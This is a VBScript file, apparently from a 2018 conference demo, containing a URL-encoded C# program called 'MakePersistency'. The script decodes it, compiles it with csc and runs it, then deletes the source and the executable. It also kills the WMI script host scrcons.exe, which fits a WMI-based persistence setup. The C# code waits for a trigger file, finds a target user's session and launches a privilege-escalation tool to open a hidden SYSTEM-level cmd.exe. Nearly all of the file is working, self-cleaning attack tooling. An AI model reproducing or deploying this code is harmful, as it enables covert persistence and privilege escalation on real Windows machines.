code = ""
code = code & "using%20System%3b%0d%0ausing%20System.Collections.Generic%3b%0d%0ausing%20System.Diagnostics%3b%0d%0ausing%20System.Management%3b%0d%0a%0d%0"
code = code & "anamespace%20MakePersistency%0d%0a%7b%0d%0a%20%20%20%20class%20Program%0d%0a%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20static%20void%20Mai"
code = code & "n(string%5b%5d%20args)%0d%0a%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(System.IO.File.Exists(%40%22c%3a%5cig"
code = code & "nite2018%5cGetConsole.txt%22)%20%7c%7c%20System.IO.File.Exists(%40%22e%3a%5cignite2018%5cGetConsole.txt%22))%0d%0a%20%20%20%20%20%20%20%20%2"
code = code & "0%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(System.IO.File.Exists(%40%22c%3a%5cignite2018%5cGetConsole.txt%22))"
code = code & "%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20System.IO.File.Mo"
code = code & "ve(%40%22c%3a%5cignite2018%5cGetConsole.txt%22%2c%20%40%22c%3a%5cignite2018%5cDontGetConsole.txt%22)%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%"
code = code & "20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%0d%0"
code = code & "a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20System.IO.File.Move(%40%22e%3a%5cignite2018%5cGetConsole.txt%22%2c%20%40%22e%3a"
code = code & "%5cignite2018%5cDontGetConsole.txt%22)%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20"
code = code & "%20%20%20%20%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20CQapplocker%20hahahah%20%3d%20new%20CQapplocker()%3b%0d%0a%20%20%20%20%20%"
code = code & "20%20%20%20%20%20%20%20%20%20%20hahahah.RunExec()%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%0d%"
code = code & "0a%20%20%20%20%20%20%20%0d%0a%20%20%20%20%7d%0d%0a%20%20%20%0d%0a%20%20%20%0d%0a%20%20%20%20class%20CQapplocker%0d%0a%20%20%20%20%7b%0d%0a%2"
code = code & "0%20%20%20%20%20%20%20string%20hackingUser%20%3d%20%22cruella%22%3b%0d%0a%20%20%20%20%20%20%20%20string%20CQSystemEscalator%20%3d%20%40%22E%"
code = code & "3a%5cignite2018%5cCQSystemEscalator.exe%22%3b%0d%0a%20%20%20%20%20%20%20%20public%20void%20RunExec()%0d%0a%20%20%20%20%20%20%20%20%7b%0d%0a%"
code = code & "20%20%20%20%20%20%20%20%20%20%20%20int%20sesid%20%3d%20GetSessionId()%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20if(sesid%20%3d%3d%200)%0d%"
code = code & "0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20hackingUser%20%3d%20%22admin%22%3b%0d%0a%20%2"
code = code & "0%20%20%20%20%20%20%20%20%20%20%20%20%20%20sesid%20%3d%20GetSessionId()%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%0d%0a%0d%0a%20"
code = code & "%20%20%20%20%20%20%20%20%20%20%20if%20(System.IO.File.Exists(%40%22C%3a%5cignite2018%5cCQSystemEscalator.exe%22))%0d%0a%20%20%20%20%20%20%20"
code = code & "%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20CQSystemEscalator%20%3d%20%40%22C%3a%5cignite2018%5cCQSystemEscalato"
code = code & "r.exe%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%2f%2f%20Use%20ProcessStartInfo%20cl"
code = code & "ass%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20ProcessStartInfo%20startInfo%20%3d%20new%20ProcessStartInfo%0d%0a%20%20%20%20%20%20%20%20%20%20"
code = code & "%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20CreateNoWindow%20%3d%20false%2c%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%"
code = code & "20%20%20UseShellExecute%20%3d%20false%2c%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20FileName%20%3d%20CQSystemEscalator%2c%0d%0a%20"
code = code & "%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20WindowStyle%20%3d%20ProcessWindowStyle.Hidden%2c%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%2"
code = code & "0%20%20Arguments%20%3d%20String.Format(%22%2fexe%20c%3a%5c%5cwindows%5c%5csystem32%5c%5ccmd.exe%20%2fid%20%22%2bsesid)%0d%0a%20%20%20%20%20%"
code = code & "20%20%20%20%20%20%20%7d%3b%0d%0a%0d%0a%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20try%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%0d%0a%20%20"
code = code & "%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2f%2f%20Start%20the%20process%20with%20the%20info%20we%20specified.%0d%0a%20%20%20%20%20%20%20%20"
code = code & "%20%20%20%20%20%20%20%20%2f%2f%20Call%20WaitForExit%20and%20then%20the%20using%20statement%20will%20close.%0d%0a%20%20%20%20%20%20%20%20%20%"
code = code & "20%20%20%20%20%20%20System.Threading.Thread.Sleep(1000)%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20using%20(Process%20exeProces"
code = code & "s%20%3d%20Process.Start(startInfo))%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%0d%0a%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20"
code = code & "%20%20%20%20%20%20%20%20exeProcess.WaitForExit()%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20System.Threading.Thread"
code = code & ".Sleep(2000)%3b%0d%0a%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%2"
code = code & "0%20%20%20%20%20%20%20%20catch%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2f%2flog%2"
code = code & "0if%20u%20want%20%3aD%20%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20%20%20%20%20pu"
code = code & "blic%20int%20GetSessionId()%0d%0a%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20string%20query%20%3d%20%22Select%20*%2"
code = code & "0from%20Win32_Process%20Where%20Name%20%3d%20%5c%22explorer.exe%5c%22%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20ManagementObjectSearche"
code = code & "r%20searcher%20%3d%20new%20ManagementObjectSearcher(query)%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20ManagementObjectCollection%20processL"
code = code & "ist%20%3d%20searcher.Get()%3b%0d%0a%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20foreach%20(ManagementObject%20obj%20in%20processList)%0d%0a%20%"
code = code & "20%20%20%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20string%5b%5d%20argList%20%3d%20new%20string%5b%5d%2"
code = code & "0%7b%20string.Empty%2c%20string.Empty%20%7d%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20int%20returnVal%20%3d%20Convert.ToInt32("
code = code & "obj.InvokeMethod(%22GetOwner%22%2c%20argList))%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(returnVal%20%3d%3d%200)%0d%0a%2"
code = code & "0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(argList%5b0%5d.Equa"
code = code & "ls(hackingUser))%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%"
code = code & "20%20%20%20%20%20%20%20return%20Convert.ToInt32(obj.GetPropertyValue(%22SessionId%22))%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20"
code = code & "%20%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%2"
code = code & "0%20%20%20%20%20%20%20%20%20return%200%3b%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20%7d%0d%0a%7d%0d%0a"

  
      set csn = new CSNetApp

      csn.code = unescape(code)

      csn.exec
  
      WScript.Sleep(100000) 

      createobject("wscript.shell").run "cmd /c taskkill /f /im scrcons.exe", 0

      Class CSNetApp

      dim sh, fso
      dim m_base, m_code, m_cmd

      public property let code(sData)
        m_code = sData
      end property

      public property get code()
        code = m_code
      end property

      private sub class_initialize
        Set sh = createobject("WScript.Shell")
        Set fso = createobject("Scripting.FileSystemObject")
        m_base = RandomName8
        m_cmd = "c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc /nologo /platform:x64 /debug- " & m_base _
                  & ".cs && " & m_base & ".exe"
      end sub

      private function Cmd(cmdline)
        Dim fOut, OutF, sCmd
        fOut = fso.GetTempName
    
        sCmd = "%COMSPEC% /c " & cmdline & " >" & fOut
        Sh.Run sCmd, 0, True
  
        If fso.FileExists(fOut) Then
          If fso.GetFile(fOut).Size>0 Then
        
            Set OutF = fso.OpenTextFile(fOut)
            WScript.Echo OutF
            Cmd = OutF.Readall
            OutF.Close
          End If
      
          fso.DeleteFile(fOut)
        End If
  
      End Function

      Public Function Exec
        WriteFile m_base & ".cs", m_code
        Exec = Cmd(m_cmd)
        fso.DeleteFile m_base & ".cs", true
        fso.DeleteFile m_base & ".exe", true
      End Function

      Private Sub WriteFile(FilePath, sData)
        With fso.OpenTextFile(FilePath, 2, True)
          .Write sData
          .Close
        End With
      End Sub

      private function RandomName8
        chrList = _
                  "abcdefghijklmnopqrstuvwxyz0123456789~-_"
        uLimit = Len(chrList)
    
        Randomize
        For i = 1 To 8
          sTmp = sTmp & Mid(chrList, ((uLimit) * Rnd + 1), 1)
        Next
        RandomName8 = sTmp

      End Function

    End Class